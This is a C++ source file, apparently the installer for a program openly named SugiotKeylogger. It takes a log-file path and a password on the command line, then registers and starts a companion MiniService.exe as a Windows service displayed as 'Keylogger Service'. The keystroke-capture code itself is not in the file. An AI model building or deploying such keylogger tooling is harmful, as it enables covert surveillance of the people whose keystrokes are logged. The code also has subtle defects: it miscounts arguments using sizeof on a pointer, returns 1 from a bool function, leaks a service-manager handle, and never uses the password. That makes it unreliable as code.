// SugiotKeylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include "resource2.h"
#include <sstream>
#include <windows.h>
#include <tchar.h>
std::wstring GetExecutablePath() {
    wchar_t buffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
    return std::wstring(buffer).substr(0, pos);
}

std::wstring GetFullPath(const std::wstring& fileName) {
    std::wstring executablePath = GetExecutablePath();
    std::wstringstream fullPath;
    fullPath << executablePath << L"\\" << fileName;
    return fullPath.str();
}
// Function to create and start a service
bool CreateAndStartService(const std::wstring& serviceName, const std::wstring& displayName, const std::wstring& exePath, LPCWSTR* lpServiceArgVectors) {
    DWORD numOfArgs = 0;
    if (lpServiceArgVectors != NULL) {
        numOfArgs = sizeof(lpServiceArgVectors) / sizeof(lpServiceArgVectors[0]);
    }
    std::wcout << L"Number of arguments: " << numOfArgs << std::endl;
    // Combine the executable path and parameters
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL) {
        std::cerr << "OpenSCManager failed with error: " << GetLastError() << std::endl;
        return 1;
    }
    // Open a handle to the Service Control Manager
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCM == NULL) {
        std::wcerr << L"OpenSCManager failed, error: " << GetLastError() << std::endl;
        return false;
    }

    // Create the service
    SC_HANDLE hService = CreateService(
        hSCM,                   // SCM database 
        serviceName.c_str(),    // name of service 
        displayName.c_str(),    // service name to display 
        SERVICE_ALL_ACCESS,     // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_DEMAND_START,   // start type 
        SERVICE_ERROR_NORMAL,   // error control type 
        exePath.c_str(),       // path to service's binary and parameters 
        NULL,                   // no load ordering group 
        NULL,                   // no tag identifier 
        NULL,                   // no dependencies 
        NULL,                   // LocalSystem account 
        NULL                    // no password 
    );

    if (hService == NULL) {
        std::wcerr << L"CreateService failed, error: " << GetLastError() << std::endl;
        CloseServiceHandle(hSCM);
        return false;
    }

    // Start the service
    if (!StartService(hService, numOfArgs, lpServiceArgVectors)) {
        std::wcerr << L"StartService failed, error: " << GetLastError() << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return false;
    }

    std::wcout << L"Service created and started successfully." << std::endl;

    // Close service handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return true;
}

int wmain(int argc, wchar_t* argv[])
{
    std::wstring servicePath = GetFullPath(L"MiniService.exe");
    // Check if the correct number of command-line arguments are provided
    if (argc < 6) {
        std::cerr << "Usage: SugiotKeylogger.exe -install -f \"log_file_full_path\" -p \"password\"" << std::endl;
        return 1;
    }

    // Parse the command-line arguments
    std::wstring action = argv[1];
    std::wstring flag1 = argv[2];
    std::wstring logFilePath = argv[3];
    std::wstring flag2 = argv[4];
    std::wstring password = argv[5];

    // Check if the action is correct
    if (action != L"-install") {
        std::cerr << "Invalid action specified. Use -install" << std::endl;
        return 1;
    }

    // Check flags and their values
    if (flag1 != L"-f" || flag2 != L"-p") {
        std::cerr << "Invalid flags specified. Use -f for log file path and -p for password" << std::endl;
        return 1;
    }

    // Display the parsed values (optional)
    std::wcout << L"Action: " << action << std::endl;
    std::wcout << L"Log file path: " << logFilePath << std::endl;
    std::wcout << L"Password: " << password << std::endl;

    // Now you can proceed with your program logic based on the parsed arguments

    // Example: Install the keylogger with the provided parameters

    // Simulated installation process (replace with actual logic)
    std::wcout << L"Installing keylogger..." << std::endl;
    // Your installation code here...
    const wchar_t* args[] = { logFilePath.c_str()};
    std::wcout << L"Keylogger installed successfully!" << std::endl;
    CreateAndStartService(L"SampleService", L"Keylogger Service", servicePath, args);
    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

